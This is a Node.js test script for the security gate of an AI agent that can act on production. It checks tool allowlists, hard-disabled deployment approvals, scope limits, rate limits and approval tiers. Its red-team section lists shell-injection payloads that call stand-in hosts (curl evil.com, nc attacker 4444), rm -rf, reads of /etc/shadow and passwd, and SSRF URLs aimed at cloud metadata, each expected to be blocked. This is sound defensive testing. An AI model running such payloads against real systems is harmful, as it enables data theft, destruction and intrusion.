#!/usr/bin/env node
/**
 * P3（agent-and-deployment）边界闸门验证 —— 含**红队用例**。
 *
 * 本阶段是从「只读」跨到「能改生产」的一步，因此验证重点不是功能，
 * 而是**防线是否真的拦得住**。设计文档 03 §8 列了八层防御纵深，
 * 本脚本逐层给正例 + 反例。
 *
 * 反例（红队）是本脚本的核心价值：只测「允许的能通过」会退化成永真断言，
 * 必须同时断言「该拦的确实被拦」。
 *
 * 用法: node scripts/agent-boundary-check.mjs
 */
import { readFileSync, writeFileSync, rmSync, mkdirSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { createRequire } from "node:module";

const here = dirname(fileURLToPath(import.meta.url));
const root = join(here, "..");
const apiDir = join(root, "apps/admin-api");
const require = createRequire(join(apiDir, "package.json"));
require("reflect-metadata");

let failures = 0;
function check(name, cond, extra = "") {
  if (cond) console.log(`  ✔ ${name}`);
  else {
    failures++;
    console.error(`  ✘ ${name}${extra ? ` — ${extra}` : ""}`);
  }
}

// ── 转译 ──────────────────────────────────────────────────────────
const ts = require("typescript");
const scratch = join(apiDir, ".boundary-check");
mkdirSync(scratch, { recursive: true });
const transpiled = new Set();

function transpileOne(relPath) {
  const src = readFileSync(join(apiDir, relPath), "utf8");
  const out = ts.transpileModule(src, {
    compilerOptions: {
      module: ts.ModuleKind.CommonJS,
      target: ts.ScriptTarget.ES2022,
      experimentalDecorators: true,
      emitDecoratorMetadata: true,
      esModuleInterop: true,
    },
    fileName: relPath,
  });
  const dest = join(scratch, relPath.replace(/\.ts$/, ".js"));
  mkdirSync(dirname(dest), { recursive: true });
  writeFileSync(dest, out.outputText);
  return src;
}

function transpileGraph(entryRel) {
  const queue = [entryRel];
  while (queue.length) {
    const rel = queue.shift();
    if (transpiled.has(rel)) continue;
    transpiled.add(rel);
    let src;
    try {
      src = transpileOne(rel);
    } catch {
      continue;
    }
    const re = /from\s+["'](\.[^"']+)["']/g;
    let m;
    while ((m = re.exec(src)) !== null) {
      const base = join(dirname(rel), m[1]).replace(/\\/g, "/");
      for (const cand of [`${base}.ts`, `${base}/index.ts`]) {
        if (transpiled.has(cand)) break;
        try {
          readFileSync(join(apiDir, cand));
          queue.push(cand);
          break;
        } catch {
          /* next */
        }
      }
    }
  }
}

let boundaryMod, registryMod, executorMod;
try {
  transpileGraph("src/modules/agent/boundary/agent-boundary.service.ts");
  transpileGraph("src/modules/agent/tools/tool-registry.ts");
  transpileGraph("src/modules/agent/tools/tool-executor.service.ts");
  boundaryMod = require(join(scratch, "src/modules/agent/boundary/agent-boundary.service.js"));
  registryMod = require(join(scratch, "src/modules/agent/tools/tool-registry.js"));
  executorMod = require(join(scratch, "src/modules/agent/tools/tool-executor.service.js"));
} catch (err) {
  console.error(`\n[FATAL] 转译失败: ${err.message}\n`);
  rmSync(scratch, { recursive: true, force: true });
  process.exit(1);
}

const { AgentBoundaryService, DEFAULT_APPROVAL_POLICY } = boundaryMod;
const {
  AGENT_TOOL_SPECS,
  AGENT_TOOL_BY_NAME,
  SESSION_TOOL_ALLOWLIST,
  toolsForSessionKind,
  HARD_DISABLED_REASON,
} = registryMod;
const { TOOL_RESULT_MAX_CHARS } = executorMod;

/** 造一个闸门实例（配置可注入）。 */
function makeGate(values = {}) {
  return new AgentBoundaryService({ get: (k) => values[k] });
}

/** 造一个会话（scope 可控）。 */
function makeSession(o = {}) {
  return {
    id: o.id ?? "sess-1",
    kind: o.kind ?? "incident",
    scopeJson: o.scope ?? { unrestricted: true },
    budgetJson: null,
    ...o,
  };
}

console.log("\n=== P3 边界闸门验证（含红队） ===\n");

// ═══ 1. 工具注册表完整性 ══════════════════════════════════════════
console.log("── 1. 工具注册表 ──");
{
  check("43 个收编工具全部登记", AGENT_TOOL_SPECS.length === 43, `count=${AGENT_TOOL_SPECS.length}`);

  const names = AGENT_TOOL_SPECS.map((t) => t.name);
  check("工具名无重复", new Set(names).size === names.length);

  // 与 mcp-server 的 43 个工具名逐一对应（防漂移）
  const mcpSrc = readFileSync(
    join(root, "packages/mcp-server/src/tools.ts"),
    "utf8",
  );
  const mcpNames = [...mcpSrc.matchAll(/server\.tool\(\s*"([a-z_]+)"/g)].map((m) => m[1]);
  check("mcp-server 侧解析到 43 个工具名", mcpNames.length === 43, `mcp=${mcpNames.length}`);

  const missing = mcpNames.filter((n) => !names.includes(n));
  check("Agent 工具集覆盖 mcp-server 全部工具（无遗漏）", missing.length === 0, `missing=${missing.join(",")}`);

  const extra = names.filter((n) => !mcpNames.includes(n));
  check("Agent 工具集无 mcp-server 之外的多余工具", extra.length === 0, `extra=${extra.join(",")}`);

  // 每个工具必须有 tier 与合法 schema
  const badTier = AGENT_TOOL_SPECS.filter(
    (t) => !["read", "write", "dangerous"].includes(t.tier),
  );
  check("全部工具有合法 tier", badTier.length === 0, badTier.map((t) => t.name).join(","));

  const badSchema = AGENT_TOOL_SPECS.filter(
    (t) => t.parameters?.type !== "object",
  );
  check("全部工具有 object 型 parameters", badSchema.length === 0, badSchema.map((t) => t.name).join(","));
}

// ═══ 2. 分级分布（安全姿态）══════════════════════════════════════
console.log("\n── 2. 工具分级 ──");
{
  const byTier = { read: [], write: [], dangerous: [] };
  for (const t of AGENT_TOOL_SPECS) byTier[t.tier].push(t.name);

  check("read 类占多数（排障主力）", byTier.read.length >= 25, `read=${byTier.read.length}`);
  check("dangerous 类是少数", byTier.dangerous.length <= 4, `dangerous=${byTier.dangerous.join(",")}`);

  // 关键：审批类工具必须硬禁用
  for (const n of ["approve_deployment", "reject_deployment"]) {
    const spec = AGENT_TOOL_BY_NAME.get(n);
    check(`${n} 已登记`, !!spec);
    check(`${n} 硬禁用（安全红线）`, spec?.hardDisabled === true);
  }

  // 硬禁用理由必须说明「双人原则」
  check("硬禁用理由说明双人原则", /双人原则/.test(HARD_DISABLED_REASON));

  // delete 类必须是 dangerous
  const del = AGENT_TOOL_BY_NAME.get("delete_application");
  check("delete_application 为 dangerous", del?.tier === "dangerous");

  // 收敛性写操作默认允许（排障必需）
  for (const n of ["trigger_task", "retry_execution", "kill_execution"]) {
    check(`${n} 为 write（可审批放行）`, AGENT_TOOL_BY_NAME.get(n)?.tier === "write");
  }
}

// ═══ 3. 第①道：工具白名单 ════════════════════════════════════════
console.log("\n── 3. 白名单（L1）──");
{
  const gate = makeGate();

  // ops_watch 是纯只读
  const opsAllowed = toolsForSessionKind("ops_watch");
  check("ops_watch 白名单非空", Array.isArray(opsAllowed) && opsAllowed.length > 0);
  check("ops_watch 不含任何写工具", !opsAllowed.some((n) => AGENT_TOOL_BY_NAME.get(n)?.tier !== "read"));

  // 红队：ops_watch 尝试写操作 → 必须被拒
  const v1 = gate.check(makeSession({ kind: "ops_watch" }), "trigger_task", { taskId: "00000000-0000-0000-0000-000000000001" }, 0);
  check("红队：ops_watch 调 trigger_task 被拒", v1.kind === "DENY", v1.kind);
  check("  拒绝原因为 not_in_toolset", v1.reason === "not_in_toolset", v1.reason);

  // 红队：ops_watch 尝试删除应用
  const v2 = gate.check(makeSession({ kind: "ops_watch" }), "delete_application", { applicationId: "00000000-0000-0000-0000-000000000002" }, 0);
  check("红队：ops_watch 调 delete_application 被拒", v2.kind === "DENY");

  // 未登记的会话类型 → 空集（拒绝一切，安全默认）
  const unknownAllowed = toolsForSessionKind("evil_kind");
  check("未登记会话类型 → 空白名单（拒绝一切）", Array.isArray(unknownAllowed) && unknownAllowed.length === 0);
  const v3 = gate.check(makeSession({ kind: "evil_kind" }), "list_tasks", {}, 0);
  check("红队：未知会话类型调只读工具也被拒", v3.kind === "DENY");

  // 未知工具名
  const v4 = gate.check(makeSession(), "rm_rf_everything", {}, 0);
  check("红队：未知工具被拒", v4.kind === "DENY" && v4.reason === "not_in_toolset");

  // incident 允许收敛性写操作
  const v5 = gate.check(makeSession({ kind: "incident" }), "trigger_task", { taskId: "00000000-0000-0000-0000-000000000001" }, 0);
  check("incident 允许 trigger_task（排障主力）", v5.kind === "ALLOW", v5.kind);

  // 但 incident 不允许 update_task（改配置应由人决定）
  const v6 = gate.check(makeSession({ kind: "incident" }), "update_task", { taskId: "00000000-0000-0000-0000-000000000001", patch: {} }, 0);
  check("红队：incident 调 update_task 被拒（改配置需人工）", v6.kind === "DENY", v6.kind);
}

// ═══ 4. 第②道：硬禁用（L6 的核心）═══════════════════════════════
console.log("\n── 4. 硬禁用（安全红线）──");
{
  // chat 类型不限工具——此时硬禁用是唯一防线
  const gate = makeGate();
  const session = makeSession({ kind: "chat" });

  const v = gate.check(session, "approve_deployment", { deploymentId: "00000000-0000-0000-0000-000000000003" }, 0);
  check("红队：approve_deployment 被拒（即使 chat 不限工具）", v.kind === "DENY", v.kind);
  check("  拒绝原因为 hard_disabled", v.reason === "hard_disabled", v.reason);
  check("  拒绝理由含双人原则说明", /双人原则/.test(v.message));

  const v2 = gate.check(session, "reject_deployment", { deploymentId: "00000000-0000-0000-0000-000000000003" }, 0);
  check("红队：reject_deployment 被拒", v2.kind === "DENY" && v2.reason === "hard_disabled");

  // 硬禁用不受配置影响（无配置开关）
  const gate2 = makeGate({
    "agent.policy.allowDangerous": true,
    "agent.policy.dangerousRequiresApproval": false,
  });
  const v3 = gate2.check(session, "approve_deployment", { deploymentId: "00000000-0000-0000-0000-000000000003" }, 0);
  check("红队：即使放开 dangerous 配置，approve 仍被拒（不可配置）", v3.kind === "DENY", v3.kind);

  // 硬禁用工具不被暴露给模型（纵深防御第一层）
  const registrySrc = readFileSync(join(apiDir, "src/modules/agent/tools/tool-registry.ts"), "utf8");
  check("硬禁用工具在 tool-registry 中标记", /hardDisabled: true/.test(registrySrc));
  const execSrc = readFileSync(join(apiDir, "src/modules/agent/tools/tool-executor.service.ts"), "utf8");
  check("执行器把硬禁用工具从可用集过滤掉", /filter\(\(s\) => !s\.hardDisabled\)/.test(execSrc));
}

// ═══ 5. 第③道：参数校验（注入）══════════════════════════════════
console.log("\n── 5. 参数校验（红队注入）──");
{
  const gate = makeGate();
  const session = makeSession({ kind: "chat" });
  const TASK = "00000000-0000-0000-0000-000000000001";

  // shell 注入
  for (const payload of [
    "x; rm -rf /",
    "x && curl evil.com",
    "x | nc attacker 4444",
    "$(whoami)",
    "`id`",
    "x || wget evil",
  ]) {
    const v = gate.check(session, "trigger_task", { taskId: TASK, params: { cmd: payload } }, 0);
    check(`红队：shell 注入被拒 (${payload.slice(0, 18)}…)`, v.kind === "DENY" && v.reason === "invalid_params", v.kind);
  }

  // 换行注入
  const vNl = gate.check(session, "trigger_task", { taskId: TASK, params: { x: "a\nrm -rf /" } }, 0);
  check("红队：换行注入被拒", vNl.kind === "DENY");

  // 路径穿越
  for (const p of ["../../etc/passwd", "..\\..\\windows\\system32", "/etc/shadow", "~/secrets"]) {
    const v = gate.check(session, "trigger_task", { taskId: TASK, params: { path: p } }, 0);
    check(`红队：路径穿越被拒 (${p})`, v.kind === "DENY" && v.reason === "invalid_params", v.kind);
  }

  // SSRF
  for (const u of [
    "http://127.0.0.1:3105/api/config",
    "http://localhost/admin",
    "http://169.254.169.254/latest/meta-data/",
    "http://192.168.1.1/router",
    "http://10.0.0.5/internal",
  ]) {
    const v = gate.check(session, "trigger_task", { taskId: TASK, params: { url: u } }, 0);
    check(`红队：SSRF 被拒 (${u.slice(0, 34)}…)`, v.kind === "DENY" && v.reason === "invalid_params", v.kind);
  }

  // 超长载荷
  const vLong = gate.check(session, "trigger_task", { taskId: TASK, params: { blob: "a".repeat(100_001) } }, 0);
  check("红队：超长载荷被拒", vLong.kind === "DENY" && vLong.reason === "invalid_params");

  // 缺必填
  const vReq = gate.check(session, "get_task", {}, 0);
  check("缺必填参数被拒", vReq.kind === "DENY" && vReq.reason === "invalid_params");

  // 未知参数（后端 forbidNonWhitelisted 会 400）
  const vExtra = gate.check(session, "get_task", { taskId: TASK, evil: "x" }, 0);
  check("未知参数被拒（防后端 400）", vExtra.kind === "DENY" && vExtra.reason === "invalid_params");

  // 嵌套注入也要扫到
  const vNest = gate.check(session, "trigger_task", { taskId: TASK, params: { a: { b: { c: "$(id)" } } } }, 0);
  check("红队：嵌套对象内的注入被拒", vNest.kind === "DENY", vNest.kind);

  // 正例：正常参数通过
  const vOk = gate.check(session, "trigger_task", { taskId: TASK, params: { target: "prod" } }, 0);
  check("正例：正常参数通过", vOk.kind === "ALLOW", vOk.kind);
}

// ═══ 6. 第④道：资源范围 ══════════════════════════════════════════
console.log("\n── 6. 资源范围（越权）──");
{
  const gate = makeGate();
  const APP_A = "00000000-0000-0000-0000-00000000000a";
  const APP_B = "00000000-0000-0000-0000-00000000000b";

  // scope 只授权 app A
  const scoped = makeSession({
    kind: "chat",
    scope: { applications: [APP_A] },
  });

  const vIn = gate.check(scoped, "get_application", { applicationId: APP_A }, 0);
  check("scope 内的资源可访问", vIn.kind === "ALLOW", vIn.kind);

  const vOut = gate.check(scoped, "get_application", { applicationId: APP_B }, 0);
  check("红队：越出 scope 的应用被拒", vOut.kind === "DENY" && vOut.reason === "out_of_scope", vOut.reason);

  // 空 scope（缺省）= 不可操作任何资源
  const noScope = makeSession({ kind: "chat", scope: {} });
  const vNo = gate.check(noScope, "get_application", { applicationId: APP_A }, 0);
  check("空 scope → 不可操作任何资源（安全默认）", vNo.kind === "DENY" && vNo.reason === "out_of_scope");

  // 显式空列表同样拒绝
  const emptyList = makeSession({ kind: "chat", scope: { applications: [] } });
  const vEmpty = gate.check(emptyList, "get_application", { applicationId: APP_A }, 0);
  check("显式空列表 → 同样拒绝", vEmpty.kind === "DENY" && vEmpty.reason === "out_of_scope");

  // 不绑定资源的工具不受 scope 限制（如 list_tasks）
  const vFree = gate.check(noScope, "list_tasks", {}, 0);
  check("不绑定资源的工具不受 scope 限制", vFree.kind === "ALLOW", vFree.kind);

  // 多资源类型各自独立
  const multi = makeSession({
    kind: "chat",
    scope: { applications: [APP_A], executors: ["exec-1"] },
  });
  check("多资源类型：应用内通过", gate.check(multi, "get_application", { applicationId: APP_A }, 0).kind === "ALLOW");
  check("多资源类型：执行器内通过", gate.check(multi, "get_executor", { executorId: "exec-1" }, 0).kind === "ALLOW");
  check("红队：未授权的执行器被拒", gate.check(multi, "get_executor", { executorId: "exec-9" }, 0).kind === "DENY");
}

// ═══ 7. 第⑤道：速率与熔断 ═══════════════════════════════════════
console.log("\n── 7. 速率与熔断 ──");
{
  const gate = makeGate();
  const session = makeSession({ kind: "chat" });
  const TASK = "00000000-0000-0000-0000-000000000001";

  // 速率上限（默认 15）
  const vRate = gate.check(session, "get_task", { taskId: TASK }, 15);
  check("达到速率上限 → 拒绝", vRate.kind === "DENY" && vRate.reason === "rate_limited", vRate.reason);
  check("未达上限 → 通过", gate.check(session, "get_task", { taskId: TASK }, 14).kind === "ALLOW");

  // 熔断：连续失败 3 次
  gate.recordOutcome("sess-1", "get_task", false);
  gate.recordOutcome("sess-1", "get_task", false);
  check("连续失败 2 次未熔断", gate.check(session, "get_task", { taskId: TASK }, 0).kind === "ALLOW");
  gate.recordOutcome("sess-1", "get_task", false);
  const vOpen = gate.check(session, "get_task", { taskId: TASK }, 0);
  check("连续失败 3 次 → 熔断", vOpen.kind === "DENY" && vOpen.reason === "circuit_open", vOpen.reason);

  // 成功重置计数
  gate.recordOutcome("sess-1", "get_task", true);
  check("成功一次即重置熔断计数", gate.check(session, "get_task", { taskId: TASK }, 0).kind === "ALLOW");

  // 熔断按 (会话, 工具) 隔离——一个工具熔断不影响另一个
  const gate2 = makeGate();
  gate2.recordOutcome("s1", "get_task", false);
  gate2.recordOutcome("s1", "get_task", false);
  gate2.recordOutcome("s1", "get_task", false);
  check("熔断隔离：同会话另一工具不受影响",
    gate2.check(makeSession({ id: "s1", kind: "chat" }), "list_tasks", {}, 0).kind === "ALLOW");
  check("熔断隔离：另一会话不受影响",
    gate2.check(makeSession({ id: "s2", kind: "chat" }), "get_task", { taskId: TASK }, 0).kind === "ALLOW");

  // 会话清理
  gate2.clearSession("s1");
  check("clearSession 后可再调用（无内存泄漏）",
    gate2.check(makeSession({ id: "s1", kind: "chat" }), "get_task", { taskId: TASK }, 0).kind === "ALLOW");
}

// ═══ 8. 第⑥道：分级审批 ══════════════════════════════════════════
console.log("\n── 8. 分级审批 ──");
{
  // 默认策略：write 放行、dangerous 禁用
  const gate = makeGate();
  const session = makeSession({ kind: "chat" });

  check("默认：write 类直接放行",
    gate.check(session, "trigger_task", { taskId: "00000000-0000-0000-0000-000000000001" }, 0).kind === "ALLOW");

  const vDanger = gate.check(session, "delete_application", { applicationId: "00000000-0000-0000-0000-000000000002" }, 0);
  check("默认：dangerous 被拒（未启用）", vDanger.kind === "DENY", vDanger.kind);

  // 显式启用 dangerous → 转为需审批
  const gate2 = makeGate({ "agent.policy.allowDangerous": true });
  const vAppr = gate2.check(session, "delete_application", { applicationId: "00000000-0000-0000-0000-000000000002" }, 0);
  check("启用 dangerous 后 → 需审批（非直接放行）", vAppr.kind === "NEED_APPROVAL", vAppr.kind);

  // write 也需审批（严格模式）
  const gate3 = makeGate({ "agent.policy.writeRequiresApproval": true });
  const vWrite = gate3.check(session, "trigger_task", { taskId: "00000000-0000-0000-0000-000000000001" }, 0);
  check("严格模式：write 需审批", vWrite.kind === "NEED_APPROVAL", vWrite.kind);

  // 只读工具永不需审批
  check("read 类永不需审批（即使全严格）",
    gate3.check(session, "list_tasks", {}, 0).kind === "ALLOW");
}

// ═══ 9. 判定顺序稳定性 ══════════════════════════════════════════
console.log("\n── 9. 判定顺序稳定性 ──");
{
  // 硬禁用优先于参数校验（避免「参数合法就能过」的误判）
  const gate = makeGate();
  const v = gate.check(
    makeSession({ kind: "chat", scope: {} }),
    "approve_deployment",
    { deploymentId: "not-a-uuid", evil: "$(id)" },
    999,
  );
  check("硬禁用优先于其他检查（原因稳定）", v.kind === "DENY" && v.reason === "hard_disabled", v.reason);

  // 白名单优先于硬禁用
  const v2 = gate.check(makeSession({ kind: "ops_watch" }), "approve_deployment", {}, 0);
  check("白名单优先于硬禁用（ops_watch 里 approve 本就不在集内）",
    v2.kind === "DENY" && v2.reason === "not_in_toolset", v2.reason);

  // 同一输入多次判定结果一致
  const results = new Set();
  for (let i = 0; i < 5; i++) {
    const g = makeGate();
    results.add(g.check(makeSession({ kind: "chat" }), "delete_application", { applicationId: "x" }, 0).reason);
  }
  check("同一输入判定结果稳定（指标标签不漂移）", results.size === 1, [...results].join(","));
}

// ═══ 10. 拒绝指标埋点 ═══════════════════════════════════════════
console.log("\n── 10. 拒绝指标埋点 ──");
{
  const src = readFileSync(join(apiDir, "src/modules/agent/boundary/agent-boundary.service.ts"), "utf8");
  check("拒绝时埋点 autoflow_agent_denied_total", /recordRuntime\("autoflow_agent_denied_total"/.test(src));
  check("埋点带 reason 标签", /autoflow_agent_denied_total",\s*\{\s*reason\s*\}/s.test(src));

  // 指标标签取值必须与 DenyReason 类型一致
  for (const r of ["not_in_toolset", "needs_approval", "invalid_params", "out_of_scope", "rate_limited", "circuit_open", "hard_disabled"]) {
    check(`DenyReason 覆盖 ${r}`, src.includes(`"${r}"`));
  }
}

// ═══ 11. 执行器纪律 ═════════════════════════════════════════════
console.log("\n── 11. 执行器纪律 ──");
{
  const src = readFileSync(join(apiDir, "src/modules/agent/tools/tool-executor.service.ts"), "utf8");

  check("执行前强制调闸门", /const verdict = this\.boundary\.check\(/.test(src));
  check("denied 落库（安全信号不能丢）", /status: "denied"/.test(src));
  check("awaiting_approval 落库（挂起恢复锚点）", /status: "awaiting_approval"/.test(src));
  check("有执行超时", /TOOL_TIMEOUT_MS/.test(src) && /withTimeout/.test(src));
  check("结果截断", /TOOL_RESULT_MAX_CHARS/.test(src));
  check("参数脱敏（含按键名剥离凭据）", /SECRET_KEYS/.test(src));
  check("截断时留存 sha256（可校验完整性）", /sha256/.test(src));
  check("速率计数排除 denied（防越权尝试消耗正常预算）",
    /c\.status !== "denied"/.test(src));

  // 结果截断阈值合理
  check("截断阈值在 1k-8k 之间", TOOL_RESULT_MAX_CHARS >= 1000 && TOOL_RESULT_MAX_CHARS <= 8000, `=${TOOL_RESULT_MAX_CHARS}`);
}

rmSync(scratch, { recursive: true, force: true });

console.log(failures ? `\n=== ${failures} 项失败 ===\n` : "\n=== 全部边界断言通过 ===\n");
process.exit(failures ? 1 : 0);
